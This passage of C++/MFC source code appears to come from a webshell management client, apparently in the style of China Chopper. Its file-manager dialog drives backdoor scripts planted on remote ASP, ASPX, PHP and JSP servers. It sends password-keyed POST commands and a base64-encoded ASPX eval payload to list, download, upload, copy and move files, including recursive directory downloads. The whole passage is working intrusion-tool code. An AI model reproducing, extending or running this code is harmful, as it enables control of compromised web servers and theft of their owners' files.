		szRemotePath_pInfo.Replace("%nPageCode%", aaa);
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if(nSiteScript_pInfo == 3)							//  PHP
	{
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szFileDownFile[2] + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if (nSiteScript_pInfo == 4)							//  JSP
	{
		CString szSiteCode = "";
		if (nSiteCode_pInfo == 65001)
		{
			szSiteCode = "UTF-8";
		}
		else if (nSiteCode_pInfo == 936)
		{
			szSiteCode = "GB2312";
		}
		else if (nSiteCode_pInfo == 950)
		{
			szSiteCode = "BIG5";
		}
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo +"=F&z0="+ szSiteCode +"&z1="+ szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}

	delete pInfo;
	if (bDownLoad)
	{
		m_edit.SetWindowText( "The download is complete: "+ sz_edit );					//设置状态栏
		if (bIsOpenDir)
		{
			bIsOpenDir = false;
			ShellExecute(NULL, "Open", _T("Explorer.exe"), _T(" /select,") + szSavePath_pInfo, NULL, SW_SHOWNORMAL);
		}
	}else{
		m_edit.SetWindowText( "File download failed : "+ sz_edit +"\tError: "+ aaa);					//设置状态栏
	}
	return 0;
}


void CFileDlg::OnFileClearCache()			//清空缓存
{
	if ( pMydbTmp->Execute("Delete from CACHE where Item like '"+ szCacheItem + "%'") )
	{
		m_edit.SetWindowText( "Clear Cache Success" );					//设置状态栏
	}else{
		m_edit.SetWindowText( "Clear Cache Failed" );					//设置状态栏
	}
}

void CFileDlg::OnDropFiles(HDROP hDropInfo)													//拖放 文件上传
{
	::SetForegroundWindow(GetSafeHwnd());	//拖动,焦点在桌面

	CString szOnDropFilePath,	//拖动的文件全路劲名
		szOnDropFile;			//拖动的文件名

	bool bFileExist = false;	//文件是否存在
	bool bUpOK = false;			//上传是否成功

	// 定义一个缓冲区来存放读取的文件名信息
	char szFileName[MAX_PATH + 1] = {0};
	// 通过设置iFiles参数为0xFFFFFFFF,可以取得当前拖动的文件数量，
	// 当设置为0xFFFFFFFF,函数间忽略后面连个参数。
	UINT nFiles = DragQueryFile(hDropInfo, 0xFFFFFFFF, NULL, 0);
	if ( nFiles )
	{
		// 通过循环依次取得拖动文件的File Name信息
		for(UINT i=0; i<nFiles; i++)
		{
			DragQueryFile(hDropInfo, i, szFileName, MAX_PATH);
			szOnDropFilePath = szFileName;
			bFileExist = false;

			szOnDropFile = szOnDropFilePath.Right( rfind(szOnDropFilePath, "\\")-1 ); //取得文件名

			for(int i = 0; i < m_filelist.GetItemCount(); ++i)
			{
				if (IsWin)
				{
					if (_stricmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}else{
					if (strcmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}
			}
			CString szEditPath;
			GetDlgItemText(IDC_COMBO_FILEPATH, szEditPath);
			//szEditPath.Replace("\\","\\\\");		//取得远程的路劲	2015.01.20 IPC BUG
			szEditPath = szEditPath + szOnDropFile;		//路劲加上文件名

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->szS1 = szEditPath;
			pInfo->szS2 = szOnDropFilePath;
			pInfo->pHwnd = this;
			Sleep(100);

			if (!bFileExist)
			{
				//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
				CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
			}else{
				if (MessageBox(szOnDropFile + " This file already exists. Replace existing file? ", "", MB_OKCANCEL) == IDOK)
				{
					//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
					CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
				}else{
					delete pInfo;
				}
			}
		}
		//上传完成，刷新列表
		//CString szRefreshPath;
		//GetDlgItemText(IDC_EDIT_PATH,szRefreshPath);
		//GetFiles(szRefreshPath, true);
	}
	// 结束此次拖拽操作，并释放分配的资源
	DragFinish(hDropInfo);
	CDialog::OnDropFiles(hDropInfo);
}


void CFileDlg::OnNMClickTree1(NMHDR *pNMHDR, LRESULT *pResult)												//单击树形 获取硬盘文件，改成 OnTvnSelchangingFileTree
{
	*pResult = 0;
	
	CPoint point;
	GetCursorPos(&point);//获得鼠标点击的位置
	m_dirtree.ScreenToClient(&point);//转化为客户坐标
	UINT uFlags;
	HTREEITEM CurrentItem = m_dirtree.HitTest(point, &uFlags);	//获得当前点击节点的ITEM

	CString szClickText,szSelectedText,szCOMBOText;
	szClickText = m_dirtree.GetItemText(CurrentItem);			//获得节点值
	szSelectedText = m_dirtree.GetItemText( m_dirtree.GetSelectedItem() );

	if (bThreadFinish && szClickText !="" && szClickText == szSelectedText)	//当前选中的，跟之前的一样。
	{
		GetDlgItemText(IDC_COMBO_FILEPATH, szCOMBOText);
		if ( szCOMBOText != "" )
		{
			if (IsWin)
			{
				if (szCOMBOText.Right(szClickText.GetLength() + 1) == szClickText + "\\")
				{
					return;
				}
			}else{
				if (szCOMBOText.Right(szClickText.GetLength() + 1) == szClickText + "/")
				{
					return;
				}
			}
			
			CString strReturn;
			CString strTemp;
			while ( CurrentItem )
			{
				strTemp  = m_dirtree.GetItemText( CurrentItem );

				if (IsWin)
				{
					strTemp += "\\";										//注意 LINUX
				}else{
					if (strTemp != "/")
					{
						strTemp += "/";										//注意 LINUX
					}
				}
				strReturn = strTemp + strReturn;
				CurrentItem = m_dirtree.GetParentItem( CurrentItem );
			}
			GetFiles_szPath = strReturn;
			GetFiles_bNoDB = false;//默认 false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);
		}
	}
}

void CFileDlg::OnFileEditFile()											//文件编辑
{
	CString temp;
	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	GetDlgItemText(IDC_COMBO_FILEPATH, temp);

	LV_ITEM lvitem = {0};
	lvitem.iItem = nList;
	lvitem.iSubItem = 0;
	lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//根据图标判断文件类型
	m_filelist.GetItem(&lvitem);

	if (lvitem.iImage== 0)				// 是文件夹
	{
	}else{																		// 是文件，编辑文件
		//AfxMessageBox("文件编辑: "+ temp+ m_filelist.GetItemText(nList,0));
		CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
		szGlobal_SiteUrl = szSiteUrl;
		szGlobal_SitePass = szSitePass;
		nGlobal_SiteScript = nSiteScript;
		nGlobal_SiteCode = nSiteCode;
		szGlobal_SiteFileSave = temp+ m_filelist.GetItemText(nList,0);
		pMainHatchet->AddFileSaveTab();

	}
	return;
}


void CFileDlg::OnFileDownloadFile()											//下载文件
{
	POSITION pos = m_filelist.GetFirstSelectedItemPosition();
	if (!pos)
	{
		return;
	}
	CFileDialog hFileDlg(FALSE,NULL ,NULL,OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY | OFN_NOCHANGEDIR,TEXT("All files(*.*)|*.*|"));

	CString szDLFilePath,szDLFileName,szRemotePath;

	GetDlgItemText(IDC_COMBO_FILEPATH, szDLFilePath);
	//szDLFilePath.Replace("\\","\\\\");		//取得远程的路劲	2015.01.20 IPC BUG

	LV_ITEM lvitem = {0};					//根据图标判断文件类型
	CString szSelectDir = "";				//要下载文件夹，只要弹出一次，选择目录就好
	bIsOpenDir = true;						//下载文件完成，是否打开文件夹。如果下载的是目录打开一次就好。
	while (pos)
	{
		int nList = m_filelist.GetNextSelectedItem(pos);
		szDLFileName = m_filelist.GetItemText(nList, 0);
		szRemotePath = szDLFilePath + szDLFileName;

		lvitem.iItem = nList;
		lvitem.iSubItem = 0;
		lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
		m_filelist.GetItem(&lvitem);
		if (lvitem.iImage == 0)				// 是文件夹
		{
			//AfxMessageBox("Software is improving!");
			//////////////////////////////////////////////////////////////////////////
			if (szSelectDir == "")
			{
				char szDir[MAX_PATH];
				BROWSEINFO bi;
				ITEMIDLIST *pidl;
				bi.hwndOwner = this->m_hWnd;
				bi.pidlRoot = NULL;
				bi.pszDisplayName = szDir;
				bi.lpszTitle = "Select";
				bi.ulFlags = BIF_RETURNONLYFSDIRS;
				bi.lpfn = NULL;
				bi.lParam = 0;
				bi.iImage = 0;
				pidl = SHBrowseForFolder(&bi);
				if(pidl && SHGetPathFromIDList(pidl, szDir) )
				{
					if (IsWin)
					{
						szSelectDir.Format("%s\\", szDir);
					}else{
						szSelectDir.Format("%s/", szDir);
					}
				}
			}
			if (szSelectDir == "")
			{
				continue;
			}
			if ( SHCreateDirectoryEx(NULL, szSelectDir + szDLFileName +"\\", NULL) != ERROR_SUCCESS)
			{
				AfxMessageBox("Failed to create directory,May already exist.\r\n"+ szSelectDir + szDLFileName +"\\");
				break;
			}

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->pHwnd = this;
			if (IsWin)
			{
				pInfo->szS1 = szRemotePath +"\\\\";
				pInfo->szS2 = szSelectDir + szDLFileName +"\\";
				Sleep(100);
				CreateThread(NULL, 0, FunDownDirGetFiles, pInfo, 0, 0);
			}else{
				pInfo->szS1 = szRemotePath +"/";
				pInfo->szS2 = szSelectDir + szDLFileName +"\\";
				Sleep(100);
				CreateThread(NULL, 0, FunDownDirGetFiles, pInfo, 0, 0);
			}
			//////////////////////////////////////////////////////////////////////////
		}else{
			hFileDlg.m_ofn.lpstrFile = szDLFileName.GetBuffer(MAX_PATH);
			hFileDlg.m_ofn.nMaxFile = MAX_PATH;
			if(hFileDlg.DoModal() == IDOK)
			{
				//FunDownloadFile( hFileDlg.GetPathName(), szRemotePath );

				FunFileInfo *pInfo;
				pInfo = new FunFileInfo;
				pInfo->szSiteUrl = szSiteUrl;
				pInfo->szSitePass = szSitePass;
				pInfo->nSiteCode = nSiteCode;
				pInfo->nSiteScript = nSiteScript;
				pInfo->szS1 = hFileDlg.GetPathName();
				pInfo->szS2 = szRemotePath;
				Sleep(100);
				CreateThread(NULL, 0, FunDownloadFile, pInfo, 0, 0);
			}
			szDLFileName.ReleaseBuffer();
		}
	}
	m_filelist.SetFocus();
}


//bool CFileDlg::DownDirGetFiles(CString szPath, CString szLocalPath)		//下载目录
DWORD WINAPI FunDownDirGetFiles(LPVOID lpParameter)		//下载目录
{
	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szPath = pInfo->szS1;
	CString szLocalPath = pInfo->szS2;

	CString szSiteCode;
	if (nSiteCode_pInfo == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode_pInfo == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode_pInfo == 950)
	{
		szSiteCode = "BIG5";
	}

	CString temp;
	CString szFileFamatPageCode;//临时用来格式化的
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		temp = UrlEnCode(nSiteCode_pInfo, szPath, false, true);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileGetFiles[0] + "&z1="+temp, nSiteCode_pInfo, temp, szError);
	}else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		szFileFamatPageCode.Format("%d", nSiteCode_pInfo);
		temp = MyBase64Encode(nSiteCode_pInfo, szPath);
		temp = szFileGetFiles[1] + "&z1="+temp;
		temp.Replace("%nPageCode%", szFileFamatPageCode);

		CString szBase64EvalCode = "var D=System.Text.Encoding.GetEncoding("+ szFileFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
			"var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{re"
			"turn System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.W"
			"rite(s[i].Name+\"/\t\"+T(P)+\"\t0\t-\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\""
			"\t\"+T(P)+\"\t\"+s[i].Length+\"\t-\n\");}";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + temp, nSiteCode_pInfo, temp, szError);
	}else if(nSiteScript_pInfo == 3){							//  PHP
		temp = MyBase64Encode(nSiteCode_pInfo, szPath);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileGetFiles[2] + "&z1="+temp, nSiteCode_pInfo, temp, szError);
	}else if (nSiteScript_pInfo == 4)							//  JSP
	{
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + "=B&z0="+szSiteCode+ "&z1="+ UrlEnCode(nSiteCode_pInfo, szPath), nSiteCode_pInfo, temp, szError);
	}
	
	if (!bHttpIsOK || temp == "")
	{
		delete pInfo;
		AfxMessageBox( szError );
		return false;
	}

	CString szFileNameLine;
	CString szFileName;
	int posX=0;
	int posY=0;

	int posA = 0,			//decodeCString 大数据处理有问题
		posB = 0;
	while( posA != -1 )
	{
		posA = temp.Find("\n", posB + 1);
		if (posA == -1)
		{
			break;
		}

		szFileNameLine = temp.Mid(posB, posA - posB);
		szFileNameLine.TrimLeft();
		szFileNameLine.TrimRight();
		posB = posA;
		//szFileNameLine = DelCRLF(filesline.GetAt(i));


		posX = szFileNameLine.Find("\t");
		posY = szFileNameLine.Find("\t", posX+1);
		szFileName = szFileNameLine.Mid(0,posX);

		
		if (szFileName != "./" && szFileName != "../" && szFileName != "")
		{
			int szFileNameLen = szFileName.GetLength();
			if (szFileName[szFileNameLen-1] == '/')			//是文件夹
			{
				szFileName.Replace("/","");
				if ( SHCreateDirectoryEx(NULL, szLocalPath + szFileName +"\\", NULL) != ERROR_SUCCESS)
				{
					AfxMessageBox("Failed to create directory,May already exist.\r\n"+ szLocalPath + szFileName +"\\");
				}else{

					FunFileInfo *pInfo3;
					pInfo3 = new FunFileInfo;
					pInfo3->szSiteUrl = szSiteUrl_pInfo;
					pInfo3->szSitePass = szSitePass_pInfo;
					pInfo3->nSiteCode = nSiteCode_pInfo;
					pInfo3->nSiteScript = nSiteScript_pInfo;
					pInfo3->szS2 = szLocalPath + szFileName +"\\";
					pInfo3->pHwnd = pInfo->pHwnd;
					if (pInfo->pHwnd->IsWin)
					{
						pInfo3->szS1 = szPath + szFileName + "\\\\";
						FunDownDirGetFiles( pInfo3 );
					}else{
						pInfo3->szS1 = szPath + szFileName + "/";
						FunDownDirGetFiles( pInfo3 );
					}
				}
			}else{																		//不是文件夹
				//FunDownloadFile( szLocalPath + szFileName, szPath + szFileName );
				FunFileInfo *pInfo2;
				pInfo2 = new FunFileInfo;
				pInfo2->szSiteUrl = szSiteUrl_pInfo;
				pInfo2->szSitePass = szSitePass_pInfo;
				pInfo2->nSiteCode = nSiteCode_pInfo;
				pInfo2->nSiteScript = nSiteScript_pInfo;
				pInfo2->szS1 = szLocalPath + szFileName;
				pInfo2->szS2 = szPath + szFileName;
				Sleep(100);
				//CreateThread(NULL, 0, FunDownloadFile, pInfo, 0, 0);
				//不需要线程，直接对DownDirGetFiles开启线程。
				FunDownloadFile(pInfo2);
			}
		}
	}

	delete pInfo;
	return 0;
}


void CFileDlg::OnFileCut()															//文件剪切
{
	szFileCopyName = "";

	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;
	GetDlgItemText(IDC_COMBO_FILEPATH,szFileCutPath);
	szFileCutName = m_filelist.GetItemText(nList,0);
	m_edit.SetWindowText( szFileCutName + " Have been cut, select the directory Paste!" );					//设置状态栏
	m_filelist.SetFocus();
}
void CFileDlg::OnFileCopy()															//文件复制
{
	szFileCutName = "";

	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;
	GetDlgItemText(IDC_COMBO_FILEPATH,szFileCopyPath);
	szFileCopyName = m_filelist.GetItemText(nList,0);
	m_edit.SetWindowText( szFileCopyName + " Have been copied, select the directory Paste!" );					//设置状态栏
	m_filelist.SetFocus();
}


void CFileDlg::OnFilePaste()					//文件粘贴
{
	CString temp,szPastePath;
	GetDlgItemText(IDC_COMBO_FILEPATH,szPastePath);

	if (szFileCutName != "")																//文件剪切
	{
		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCut[0] + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if (nSiteScript == 2)							//  ASPX
		{
			temp = szFileCut[1];
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if(nSiteScript == 3){							//  PHP
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCut[2] + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=H&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=E&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName), nSiteCode, temp, szError);
		}
	}
	//////////////////////////////////////////////////////////////////////////
	if (szFileCopyName != "")																//文件复制
	{
		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCopy[0] + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if (nSiteScript == 2)							//  ASPX
		{
			temp = szFileCopy[1];
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if(nSiteScript == 3){							//  PHP
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCopy[2] + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=H&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}
	}

	if (szFileCutName == "" && szFileCopyName == "")
	{
		m_edit.SetWindowText( "Paste Error,Clipboard is empty!" );					//设置状态栏
		m_filelist.SetFocus();
		return;
	}
	//////////////////////////////////////////////////////////////////////////

	if (!bHttpIsOK)
	{
		AfxMessageBox( szError );
		return;
	}
	if (temp.Left(8) == "ERROR://")
	{
		m_edit.SetWindowText( temp );					//设置状态栏
		m_filelist.SetFocus();
		return;
	}

	if (temp != "1")
	{
		m_edit.SetWindowText( "Paste Error!" );					//设置状态栏
	}else{
		OnFileRefresh();
	}
	m_filelist.SetFocus();
}


void CFileDlg::OnTvnSelchangingFileTree(NMHDR *pNMHDR, LRESULT *pResult)				//选定从一项，变成另一项
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
		*pResult = TRUE;		//返回 TRUE 禁止选择另一项；返回 FALSE 则允许选择另一项。
		return;
	}

	HTREEITEM m_hItem = pNMTreeView->itemNew.hItem;

	CString szDrive = m_dirtree.GetItemText(m_hItem);
	if (szDrive != "")
	{
		CString strReturn;
		CString strTemp;
		while ( m_hItem )
		{
			strTemp  = m_dirtree.GetItemText( m_hItem );

			if (IsWin)
			{
				strTemp += "\\";										//注意 LINUX
			}else{
				if (strTemp != "/")
				{
					strTemp += "/";										//注意 LINUX
				}
			}
			strReturn = strTemp + strReturn;
			m_hItem = m_dirtree.GetParentItem( m_hItem );
		}
		GetFiles_szPath = strReturn;
		GetFiles_bNoDB = false;//默认 false
		bThreadFinish = false;
		CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

		//GetFiles(strReturn);/* path = C: \ WWW \ */
	}

	*pResult = 0;
}

void CFileDlg::OnBnClickedUpperstory()			//返回上一层
{
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
		return;
	}

	CString temp;
	GetDlgItemText(IDC_COMBO_FILEPATH, temp);

	temp = GetUpperDtoryPath( temp, IsWin );

	SetDlgItemText(IDC_COMBO_FILEPATH, temp);

	OnBnClickedReadfiles();//读取
}
